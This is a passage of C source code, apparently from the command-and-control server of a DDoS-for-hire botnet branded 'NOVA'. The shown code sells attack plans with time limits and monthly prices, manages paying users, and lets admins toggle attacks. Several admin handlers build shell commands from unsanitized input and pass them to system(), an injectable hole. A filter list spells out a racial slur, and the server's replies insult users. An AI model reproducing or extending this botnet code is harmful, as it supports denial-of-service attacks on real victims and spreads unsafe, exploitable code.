						sprintf(admin9,  "\t\t"P"|                                                "P"|\r\n");             
						sprintf(admin10, "\t\t"P"â•š"W"================================================"P"â•\r\n");             
		
						if(send(datafd, admin1, strlen(admin1), MSG_NOSIGNAL) == -1) goto end; 
						if(send(datafd, admin2, strlen(admin2), MSG_NOSIGNAL) == -1) goto end;
						if(send(datafd, admin3, strlen(admin3), MSG_NOSIGNAL) == -1) goto end;
						if(send(datafd, admin4, strlen(admin4), MSG_NOSIGNAL) == -1) goto end;
						if(send(datafd, admin5, strlen(admin5), MSG_NOSIGNAL) == -1) goto end;
						if(send(datafd, admin6, strlen(admin6), MSG_NOSIGNAL) == -1) goto end;
						if(send(datafd, admin7, strlen(admin7), MSG_NOSIGNAL) == -1) goto end;
						if(send(datafd, admin8, strlen(admin8), MSG_NOSIGNAL) == -1) goto end;
						if(send(datafd, admin9, strlen(admin9), MSG_NOSIGNAL) == -1) goto end;
						if(send(datafd, admin10, strlen(admin10), MSG_NOSIGNAL) == -1) goto end;
						pthread_create(&title, NULL, &TitleWriter, sock);
				 	}
 				}	

 			else if(strcasestr(buf, "plans"))
 			{
 				char plans[8000];
 	  send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);			
				if(send(datafd, Nova_banner1,  strlen(Nova_banner1),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner2,  strlen(Nova_banner2),	MSG_NOSIGNAL) == -1) goto end; 
				if(send(datafd, Nova_banner3,  strlen(Nova_banner3),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner4,  strlen(Nova_banner4),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner5,  strlen(Nova_banner5),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner6,  strlen(Nova_banner6),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner7,  strlen(Nova_banner7),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner8,  strlen(Nova_banner8),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner9,  strlen(Nova_banner9),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_bannera,  strlen(Nova_bannera),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_bannerb,  strlen(Nova_bannerb),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_bannerc,  strlen(Nova_bannerc),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_bannerd,  strlen(Nova_bannerd),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_bannere,  strlen(Nova_bannere),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_bannerf,  strlen(Nova_bannerf),	MSG_NOSIGNAL) == -1) goto end;
 				sprintf(plans, ""W"Basic:\r\n"P"Max Time: 800\r\nCooldown: 120\r\n"E"Monthly:  10$\r\n"W"VIP:\r\n"P"Maxtime:  1600\r\nCooldown: 90\r\n"E"Monthly:  20$\r\n"W"MVP:\r\n"P"Maxtime:  2400\r\nCooldown: 60\r\n"E"Monthly:  25$\r\n");
 				if(send(datafd, plans, strlen(plans), MSG_NOSIGNAL) == -1) goto end;
 			}

				
///////////////////////////////////////////////////////////////////////////////////////////////START OF EXTRA COMMANDS////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////START OF EXTRA COMMANDS////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////START OF EXTRA COMMANDS////////////////////////////////////////////////////////////////////////////

else if(strcasestr(buf, "msg") || strcasestr(buf, "message"))
	{	
		int tosend;
		char sentmsg[800];
		char msg[800];
		char usertomsg[800];
		sprintf(usethis, "User:");
		if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
		memset(buf, 0, sizeof(buf));
		if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
		trim(buf);
		strcpy(usertomsg, buf);

		sprintf(usethis, "MSG:");
		if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
		memset(buf, 0, sizeof(buf));
		if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
		trim(buf);
		strcpy(msg, buf);
		if(strcasestr(msg, "nigger") || strcasestr(msg, "nig") || strcasestr(msg, "n1g") || strcasestr(msg, "nlg") || strcasestr(msg, "n.i.g") || strcasestr(msg, "n!g") || strcasestr(msg, "n|g"))
		{
			sprintf(usethis, ""Y"This Word Is Not Allowed Here!\r\n");
			if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
			sleep(2);
		} else {

		for(tosend=0;tosend < MAXFDS;tosend++){
			if(strstr(managements[tosend].id, usertomsg))
			{
				if(managements[tosend].msgtoggle == 0)
				{
					char sendmsg[800];
					sprintf(sendmsg, "\r\n"Y"MSG From %s: %s\r\n", managements[datafd].id, msg);
					if(send(tosend, sendmsg, strlen(sendmsg), MSG_NOSIGNAL) == -1) goto end;
					sprintf(sendmsg, "\r\n"P"ðŸ’”"E"%s"W"@"E"NOVA"P"ðŸ’”"W":", managements[tosend].id);
					if(send(tosend, sendmsg, strlen(sendmsg), MSG_NOSIGNAL) == -1) goto end;
					sent = 1;
				} else {
					sent = 3;
				}
			}
		}		
			if(sent == 1)
			{
				sprintf(sentmsg, ""Y"Msg Sent to: %s\r\n", usertomsg);
				if(send(datafd, sentmsg, strlen(sentmsg), MSG_NOSIGNAL) == -1) goto end;
				sent = 0;
			}
			else if(sent == 3)
			{
				sprintf(usethis, ""Y"User %s Has Messages Toggled OFF\r\n", usertomsg);
				if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
			}

			else if(!sent)  
			{
				sprintf(usethis, ""Y"User %s Isnt Online\r\n", usertomsg);
				if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
				memset(msg,0,sizeof(msg));
			} 
		}
		memset(buf,0,sizeof(buf));
	}

if(strcasestr(buf, "online"))
{
      send(datafd, "\033[1A\033[2J\033[1;1H", strlen("\033[1A\033[2J\033[1;1H"), MSG_NOSIGNAL);			
				if(send(datafd, Nova_banner1,  strlen(Nova_banner1),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner2,  strlen(Nova_banner2),	MSG_NOSIGNAL) == -1) goto end; 
				if(send(datafd, Nova_banner3,  strlen(Nova_banner3),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner4,  strlen(Nova_banner4),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner5,  strlen(Nova_banner5),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner6,  strlen(Nova_banner6),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner7,  strlen(Nova_banner7),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner8,  strlen(Nova_banner8),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_banner9,  strlen(Nova_banner9),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_bannera,  strlen(Nova_bannera),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_bannerb,  strlen(Nova_bannerb),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_bannerc,  strlen(Nova_bannerc),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_bannerd,  strlen(Nova_bannerd),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_bannere,  strlen(Nova_bannere),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, Nova_bannerf,  strlen(Nova_bannerf),	MSG_NOSIGNAL) == -1) goto end;
	if(managements[datafd].adminstatus == 1)
	{
		int online;
		sprintf(usethis, ""W"Users Online\r\n");
		if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
		for(online=0;online < MAXFDS; online++)
		{
			if(strlen(managements[online].id) > 1 && managements[online].connected == 1) 
			{
				if(strcmp(managements[online].planname, "admin") == 0)
				{
					sprintf(botnet, ""Y"%s | IP: HIDDEN\r\n", managements[online].id);
					if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
				} else {
					sprintf(botnet, ""W"%s | IP: %s\r\n", managements[online].id, managements[online].my_ip);
					if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
				}
			}
		}
	} else 
	{
		int online;
		for(online=0;online < MAXFDS; online++)
		{
			if(strlen(managements[online].id) > 1 && managements[online].connected == 1) 
			{
				sprintf(botnet, ""Y"%s | IP: HIDDEN\r\n", managements[online].id);
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
			}
		}
	}
	sprintf(botnet, ""P"Total Users Online: %d\r\n", OperatorsConnected);
	if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
}


///////////////////////////////////////////////////////////////////////////////////////////////END OF EXTRA COMMANDS////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////END OF EXTRA COMMANDS////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////END OF EXTRA COMMANDS////////////////////////////////////////////////////////////////////////////


///////////////////////////////////////////////////////////////////////////////////////////////START OF ADMIN COMMANDS////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////START OF ADMIN COMMANDS////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////////////////START OF ADMIN COMMANDS////////////////////////////////////////////////////////////////////////////
if(strcasestr(buf, "user")) {
	if(managements[datafd].adminstatus == 1)
	{
		char options[80];
		char cmd1[800];
		char send1[800];
		char whatyucanuse1[2048];
		char whatyucanuse2[2048];
		char whatyucanuse3[2048];
		char whatyucanuse4[2048];
		char whatyucanuse5[2048];
		char whatyucanuse6[2048];
		char whatyucanuse7[2048];
		char whatyucanuse8[2048];
		char whatyucanuse9[2048];
		char whatyucanuse10[2048];
		char whatyucanuse11[2048];
		char whatyucanuse12[2048];
		char whatyucanuse13[2048];
		char whatyucanuse14[2048];
		char whatyucanuse15[2048];
		char whatyucanuse16[2048];
		char whatyucanuse17[2048];
		char whatyucanuse18[2048];


		sprintf(whatyucanuse1,  "\t      "P"â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•—   "P"â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\r\n");
		sprintf(whatyucanuse2,  "\t    "W"1 "P"â•‘  "W"Add User.  "P"â•‘ "W"7 "P"â•‘  "W"Kick User. "P"â•‘\r\n");
		sprintf(whatyucanuse3,  "\t      "P"â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•   "P"â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•\r\n");
		sprintf(whatyucanuse4,  "\t      "P"â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•—   "P"â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\r\n");
		sprintf(whatyucanuse5,  "\t    "W"2 "P"â•‘  "W"Rem User.  "P"â•‘ "W"8 "P"â•‘  "W"Blacklist. "P"â•‘\r\n");
		sprintf(whatyucanuse6,  "\t      "P"â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•   "P"â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•\r\n");
		sprintf(whatyucanuse7,  "\t      "P"â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•—   \r\n");
		sprintf(whatyucanuse8,  "\t    "W"3 "P"â•‘  "W"Ban User.  "P"â•‘   \r\n");
		sprintf(whatyucanuse9,  "\t      "P"â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•   \r\n");
		sprintf(whatyucanuse10, "\t      "P"â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•—   \r\n");
		sprintf(whatyucanuse11, "\t    "W"4 "P"â•‘ "W"UnBan User. "P"â•‘   \r\n");
		sprintf(whatyucanuse12, "\t      "P"â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•   \r\n");
		sprintf(whatyucanuse13, "\t      "P"â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•—   \r\n");
		sprintf(whatyucanuse14, "\t    "W"5 "P"â•‘ "W"IPBan User. "P"â•‘   \r\n");
		sprintf(whatyucanuse15, "\t      "P"â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•   \r\n");
		sprintf(whatyucanuse16, "\t      "P"â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•— \r\n");
		sprintf(whatyucanuse17, "\t    "W"6 "P"â•‘ "W"UnIPBan User. "P"â•‘ \r\n");
		sprintf(whatyucanuse18, "\t      "P"â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• \r\n");


		if(send(datafd, whatyucanuse1, strlen(whatyucanuse1), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, whatyucanuse2, strlen(whatyucanuse2), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, whatyucanuse3, strlen(whatyucanuse3), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, whatyucanuse4, strlen(whatyucanuse4), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, whatyucanuse5, strlen(whatyucanuse5), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, whatyucanuse6, strlen(whatyucanuse6), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, whatyucanuse7, strlen(whatyucanuse7), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, whatyucanuse8, strlen(whatyucanuse8), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, whatyucanuse9, strlen(whatyucanuse9), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, whatyucanuse10, strlen(whatyucanuse10), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, whatyucanuse11, strlen(whatyucanuse11), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, whatyucanuse12, strlen(whatyucanuse12), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, whatyucanuse13, strlen(whatyucanuse13), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, whatyucanuse14, strlen(whatyucanuse14), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, whatyucanuse15, strlen(whatyucanuse15), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, whatyucanuse16, strlen(whatyucanuse16), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, whatyucanuse17, strlen(whatyucanuse17), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, whatyucanuse18, strlen(whatyucanuse18), MSG_NOSIGNAL) == -1) goto end;

		sprintf(options, ""Y"Option:");
		if(send(datafd, options, strlen(options), MSG_NOSIGNAL) == -1) goto end;
		memset(buf, 0, sizeof(buf));
		if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
		trim(buf);

		if(strcasestr(buf, "1") || strcasestr(buf, "ONE"))
		{
			char username1[80];
			char password1[80];
			char status1[80];
			char maxtime1[80];
			char cooldown1[80];
			char newexpiry[800];
			char send1[1024];
			sprintf(usethis, ""Y"Usename:");
			if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
			memset(buf, 0, sizeof(buf));
			if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
			trim(buf);
			strcpy(username1, buf);

			sprintf(usethis, ""Y"password:");
			if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
			memset(buf, 0, sizeof(buf));
			if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
			trim(buf);
			strcpy(password1, buf);

			sprintf(usethis, ""Y"admin(y or n):");
			if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
			memset(buf, 0, sizeof(buf));
			if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
			trim(buf);
			
			if(strcasestr(buf, "y") || strcasestr(buf, "yes"))
			{
				strcpy(status1, "admin");
				strcpy(maxtime1, "1200");
				strcpy(cooldown1, "0");
				strcpy(newexpiry, "99/99/99");
				goto thing;
			} 

			sprintf(usethis, "   "W"â•”â•â•â•â•â•â•â•â•— â•”â•â•â•â•â•â•â•â•— â•”â•â•â•â•â•â•â•â•—\r\n   â•‘"P" Basic "W"â•‘ â•‘ "P" VIP "W" â•‘ â•‘"P"  MVP "W" â•‘\r\n   "W"â•šâ•â•â•â•â•â•â•â• â•šâ•â•â•â•â•â•â•â• â•šâ•â•â•â•â•â•â•â•\r\n");
			if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;

			sprintf(usethis, ""Y"Plan:");
			if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
			memset(buf, 0, sizeof(buf));
			if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
			trim(buf);

			if(strcasestr(buf, "BASIC"))
			{
				strcpy(maxtime1, "800");
				strcpy(cooldown1, "120");
				strcpy(status1, "Basic");
			}

			if(strcasestr(buf, "VIP"))
			{
				strcpy(maxtime1, "1600");
				strcpy(cooldown1, "90");
				strcpy(status1, "Vip");
			}
			
			if(strcasestr(buf, "MVP"))
			{
				strcpy(maxtime1, "2400");
				strcpy(cooldown1, "60");
				strcpy(status1, "MVP");				
			}				
			sprintf(usethis, ""Y"Usage: DD/MM/YY\r\nExpiry:");
			if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
			memset(buf, 0,sizeof(buf));
			if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
			trim(buf);
			strcpy(newexpiry, buf);
			thing:
			sprintf(cmd1, "%s %s %s %s %s %s", username1, password1, status1, maxtime1, cooldown1, newexpiry);
			sprintf(send1, "echo '%s' >> users/login.txt", cmd1);
			system(send1);
			sprintf(usethis, ""Y"Account [%s] Added\r\n", username1);
			if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
			printf(""Y"%s Added User: [%s] Plan: [%s]\n", managements[datafd].id, username1, status1);

		}
		else if(strcasestr(buf, "2") || strcasestr(buf, "TWO"))
		{
			char removeuser[80];
			char sys[800];
			sprintf(usethis, "Usename:");
			if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
			memset(buf, 0, sizeof(buf));
			if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
			trim(buf);
			strcpy(removeuser, buf);
			sprintf(sys,"sed '/\\<%s\\>/d' -i users/login.txt", removeuser);
			system(sys);
			sprintf(usethis, ""Y"Account [%s] Has Been Removed\r\n", removeuser);
			if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
			printf(""Y"%s Removed User: [%s]\n", managements[datafd].id, removeuser);
		}
		else if(strcasestr(buf, "3") || strcasestr(buf, "THREE"))
		{
			char banuser[80];
			sprintf(usethis, "Username:");
			if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
			memset(buf, 0, sizeof(buf));
			if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
			trim(buf);
			strcpy(banuser, buf);
			sprintf(send1, "echo '%s' >> logs/BANNEDUSERS.txt", banuser);
			system(send1);
			sprintf(usethis, ""Y"Account [%s] Has Been Banned\r\n", banuser);
			if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
			printf(""Y"%s Banned User: [%s]\n", managements[datafd].id, banuser);
		}
		else if(strcasestr(buf, "4") || strcasestr(buf, "FOUR"))
		{
			char sys[800];
			char unbanuser[80] ;
			sprintf(usethis, "Username:");
			if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
			memset(buf, 0, sizeof(buf));
			if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
			trim(buf);
			strcpy(unbanuser, buf);
			sprintf(sys,"sed '/\\<%s\\>/d' -i logs/BANNEDUSERS.txt", unbanuser);
			system(sys);
			sprintf(usethis, ""Y"Account [%s] Has Been UnBanned\r\n", unbanuser);
			if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
			printf(""Y"%s UnBanned User: [%s]\n", managements[datafd].id, unbanuser);
		}
		else if(strcasestr(buf, "5") || strcasestr(buf, "FIVE"))
		{
			char ipbanuser[80];
			sprintf(usethis, "IP:");
			if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
			memset(buf, 0, sizeof(buf));
			if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
			trim(buf);
			strcpy(ipbanuser, buf);
			sprintf(send1, "echo '%s' >> logs/IPBANNED.txt",ipbanuser);
			system(send1);
			sprintf(usethis, ""Y"[%s] Has Been IP Banned\r\n", buf);
			if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
			printf(""Y"%s IP Banned: [%s]\r\n", managements[datafd].id, ipbanuser);
		}
		else if(strcasestr(buf, "6") || strcasestr(buf, "SIX"))
		{
			char sys[800];
			sprintf(usethis, "IP:");
			if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
			memset(buf, 0, sizeof(buf));
			if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
			trim(buf);
			sprintf(sys, "sed '/\\<%s\\>/d' -i logs/IPBANNED.txt", buf);
			system(sys);
			sprintf(usethis, ""Y"[%s] Has Been UnIPBanned\r\n", buf);
			if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
			printf(""Y"%s UnIPBanned: [%s]\n", managements[datafd].id, buf);
		}

		else if(strcasestr(buf, "7") || strcasestr(buf, "seven"))
		{	
			int fail;
			char usertokick[800];
			sprintf(usethis, "Users Online\r\n");
			if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
			int kickonline;
			for(kickonline=0;kickonline < MAXFDS;kickonline++)
			{
				if(strlen(managements[kickonline].id) > 1 && managements[kickonline].connected == 1)
				{
					char kickonlineusers[800];
					sprintf(kickonlineusers, "| %s |\r\n", managements[kickonline].id);
					if(send(datafd, kickonlineusers, strlen(kickonlineusers), MSG_NOSIGNAL) == -1) goto end;
				}
			}
			sprintf(usethis, "Username:");
			if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
			memset(buf, 0, sizeof(buf));
			if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
			trim(buf);
			strcpy(usertokick, buf);

			for(kickonline=0;kickonline<MAXFDS;kickonline++)
			{
				if(!strcmp(managements[kickonline].id, usertokick))
				{
					sprintf(usethis, "\r\n"Y"You Have Been Kicked GTFO SHITTER!\r\n");
					if(send(kickonline, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
					sent = 1;
					sleep(1);
					memset(managements[kickonline].id,0, sizeof(managements[kickonline].id));
					OperatorsConnected--;
					managements[kickonline].connected = 0;
					close(kickonline);
				}
			}
			if(sent != NULL)
			{
				sprintf(usethis,""Y"User %s Has Been Kicked\r\n", usertokick);
				if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
				printf(""Y"%s Kicked User: [%s]\r\n", managements[datafd].id, usertokick);
			}

			else if(!sent)
			{
				sprintf(usethis, ""Y"User %s Isnt Online... Did You Not Read the Online List Retard!?\r\n", usertokick);
				if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
			}
		}

		else if(strstr(buf, "8"))
		{
			char Blacklistip[80];
			sprintf(usethis, "IP:");
			if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
			memset(buf, 0, sizeof(buf));
			if(fdgets(buf, sizeof(buf), datafd) < 1) goto end;
			trim(buf);
			strcpy(Blacklistip, buf);
			sprintf(send1, "echo '%s' >> logs/Blacklist.txt",Blacklistip);
			system(send1);
			sprintf(usethis, ""Y"[%s] Has Been Blacklisted\r\n", Blacklistip);
			if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
			printf(""Y"%s Blacklisted IP: [%s]\r\n", managements[datafd].id, Blacklistip);
		}
		else if(strstr(buf, "cls"));
		{
			//nun
		}
	} else {
 		char noperms[800];
 		sprintf(noperms, ""Y"You Do Not Have Admin Perms Bitch!   - add user\r\n");
 		if(send(datafd, noperms, strlen(noperms), MSG_NOSIGNAL) == -1) goto end;
	}
}

        if(strcasestr(buf, "motd"))
 		{
			if(managements[datafd].adminstatus == 1)
            {
           		char sendbuf[50]; 
 				memset(buf, 0, sizeof(buf));
 				sprintf(sendbuf, ""W"MOTD: "); 
 				send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL);
 				fdgets(buf, sizeof(buf), datafd);
 				trim(buf);
 				if(strlen(buf) < 80)
 				{
 						motdaction = 1;
 						strcpy(motd, buf);
 						sprintf(usethis, ""Y"MOTD Has Been Updated\r\n");
 						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
 				}
			}
			else
			{
				char sendbuf[50]; 
				sprintf(sendbuf, ""Y"You Do Not Have Admin Perms Bitch! - MOTD\r\n");
				send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL);
			}
			
 		}


 		else if(strcasestr(buf, "broadcast"))
 		{
 			if(managements[datafd].adminstatus == 1)
 			{
 				int brdcstthing;
 				int userssentto = 0;
 				int msgoff = 0;
 				sprintf(usethis, "MSG:");
 				if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
 				memset(buf, 0, sizeof(buf));
 				if(fdgets(buf, sizeof(buf), datafd) > 1) goto end;
 				trim(buf);
 				strcpy(broadcastmsg, buf);
 				memset(buf,0,sizeof(buf));
 					if(strlen(broadcastmsg) < 80)
 					{
 						if(OperatorsConnected > 1)
 						{
 							for(brdcstthing=0;brdcstthing<MAXFDS;brdcstthing++)
 							{
 								if(managements[brdcstthing].connected == 1 && strcmp(managements[brdcstthing].id, managements[datafd].id) != 0)
 								{
 									if(managements[brdcstthing].broadcasttoggle == 0)
 									{
 										sprintf(usethis, "\r\n"Y"Broadcasted Message From %s\r\nMSG: %s\r\n", managements[datafd].id, broadcastmsg);
 										if(send(brdcstthing, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
	
 										sprintf(usethis, "\r\n"P"ðŸ’”"E"%s"W"@"E"NOVA"P"ðŸ’”"W":", managements[brdcstthing].id);
 										if(send(brdcstthing, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
 										sent = 1;
 										userssentto++;
 									} else {
 										msgoff++;
 									}
 								} else {
 									//nun
 								}
 							}
 						} else {
 							sprintf(usethis, ""Y"There Are Currently No Users Online\r\n");
 							if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
 						}
 					} else {
 						sprintf(usethis, ""Y"Broadcasted Message Cannot Be Over 80 Characters\r\n");
 						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
 					}

 					if(sent == 1)
 					{
	
 						sprintf(usethis, ""Y"Message Broadcasted To %d Users | %d Users Have Broadcast Toggled Off\r\n", userssentto, msgoff);
 						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
 						sent = 0;
 						printf(""Y"%s Broadcasted Message %s to %d Online Users | %d Users Have Broadcast Toggled Off\r\n", managements[datafd].id, broadcastmsg, userssentto, msgoff);
 						userssentto = 0;
 						msgoff = 0;
 					}

 			} else {
				char sendbuf[50]; 
				sprintf(sendbuf, ""Y"You Do Not Have Admin Perms Bitch! - BROADCAST\r\n");
				send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL); 		 				
 			}
 		}

 		if(strcasestr(buf, "ToggleListen"))
 		{
 			if(managements[datafd].adminstatus == 1)
 			{
 				if(managements[datafd].listenattacks == 0)
 				{
 					managements[datafd].listenattacks = 1;
 					sprintf(usethis, ""Y"Attack Listen Has Been turned ON\r\n");
 					if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
 				}
 				else if(managements[datafd].listenattacks == 1)
 				{
 					managements[datafd].listenattacks = 0;
 					sprintf(usethis, ""Y"Attack Listen Has Been turned OFF\r\n");
 					if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
 				}
 			} else {
				char sendbuf[50]; 
				sprintf(sendbuf, ""Y"You Do Not Have Admin Perms Bitch! - TOGGLELISTEN\r\n");
				send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL); 				
 			}
 		}

 		else if(strcasestr(buf, "ToggleAttacks"))
 		{
 			if(managements[datafd].adminstatus == 1)
 			{
 				if(AttackStatus == 0)
 				{
                			sprintf(usethis, ""Y"Attacks Have Been Toggled OFF\r\n");
                			if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
                			AttackStatus = 1;
 				} else {
                			sprintf(usethis, ""Y"Attacks Have Been Toggled ON\r\n");
                			if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
                			AttackStatus = 0; 					
 				}
 			} else {
				char sendbuf[50]; 
				sprintf(sendbuf, ""Y"You Do Not Have Admin Perms Bitch! - TOGGLEATTACKS\r\n");
				send(datafd, sendbuf, strlen(sendbuf), MSG_NOSIGNAL); 	 				
 			}
 		}

 		else if(strcasestr(buf, "ToggleLogin"))
 		{
 			if(managements[datafd].adminstatus == 1)
 			{
 				if(managements[datafd].LoginListen == 1)
 				{
 					sprintf(usethis, ""Y"You Have Stopped Listening To Logins/Logouts\r\n");
 					if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
